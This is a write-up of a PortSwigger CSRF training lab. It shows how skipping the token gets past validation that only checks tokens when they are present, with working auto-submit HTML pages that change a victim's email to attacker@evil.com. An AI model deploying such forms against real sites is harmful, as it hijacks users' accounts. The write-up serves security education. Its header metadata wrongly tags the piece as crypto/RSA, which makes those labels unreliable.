---
title: "csrf 3 - portswigger labs"
category: "crypto"
subcategory: "rsa"
type: "writeup"
tags: ["crypto", "wiener", "csrf", "rsa", "cryptography", "csrf-3"]
summary: "crypto writeup for \"csrf 3\" from portswigger labs - techniques: wiener, csrf, rsa, cryptography, csrf-3."
source:
  name: "siunam321.github.io"
  url: "https://siunam321.github.io/ctf/portswigger-labs/CSRF/csrf-3/"
original_source:
  name: "siunam321/siunam321.github.io"
  url: "https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/CSRF/csrf-3/README.md"
ctf:
  name: "portswigger labs"
  challenge: "csrf 3"
---

## Source

- **CTF:** portswigger labs
- **Challenge:** csrf 3
- **Author:** [siunam321](https://siunam321.github.io/)
- **Writeup:** <https://siunam321.github.io/ctf/portswigger-labs/CSRF/csrf-3/>
- **Source file:** <https://github.com/siunam321/siunam321.github.io/blob/87b2af97016b8b5def0b3ffc0b37a6e89d876d95/ctf/portswigger-labs/CSRF/csrf-3/README.md>

---
# CSRF where token validation depends on token being present | Dec 15, 2022

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present), you'll learn: CSRF where token validation depends on token being present! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-3/images/Pasted%20image%2020221215005004.png)

**Login as user `wiener`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-3/images/Pasted%20image%2020221215005026.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-3/images/Pasted%20image%2020221215005030.png)

**In the previous labs, we found that the email change functionality is vulnerable to CSRF.**

**Let's inspect the form!**
```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="">
    <input required type="hidden" name="csrf" value="NyEhcWXR4C1lk7nt89xf9bXUnIqycDQL">
    <button class='button' type='submit'> Update email </button>
</form>
```

**As you can see, there is a CSRF token!**

**Now, we can try to exploit CSRF via the `exploit server`:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-3/images/Pasted%20image%2020221215005149.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-3/images/Pasted%20image%2020221215005201.png)

**To do so, I'll try to craft a CSRF form including an invalid CSRF token that performs CSRF attack:**
```html
<html>
	<head>
		<title>CSRF-3</title>
	</head>
	<body>
		<form action="https://0a7b000103e23b4fc097dbfe00370008.web-security-academy.net/my-account/change-email" method="POST">
		    <input type="hidden" name="email" value="attacker@evil.com">
		    <input type="hidden" name="csrf" value="LQDcyqInUXb9fx98tn7kl1C4RXWchEyN">
		</form>

		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
```

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-3/images/Pasted%20image%2020221215005541.png)

**We can test it locally via the `View exploit` button:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-3/images/Pasted%20image%2020221215005609.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-3/images/Pasted%20image%2020221215005620.png)

As expected, it outputs `Invalid CSRF token`.

**To bypass the CSRF token, we try to not include the CSRF token:**
```html
<html>
	<head>
		<title>CSRF-3</title>
	</head>
	<body>
		<form action="https://0a7b000103e23b4fc097dbfe00370008.web-security-academy.net/my-account/change-email" method="POST">
		    <input type="hidden" name="email" value="attacker@evil.com">
		</form>

		<script>
			document.forms[0].submit();
		</script>
	</body>
</html>
```

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-3/images/Pasted%20image%2020221215005743.png)

**Then test it locally:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-3/images/Pasted%20image%2020221215005800.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-3/images/Pasted%20image%2020221215005811.png)

It works!!

**Now, let's change other users' email!**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-3/images/Pasted%20image%2020221215005843.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-3/images/Pasted%20image%2020221215005852.png)

We did it!

# What we've learned:

1. CSRF where token validation depends on token being present
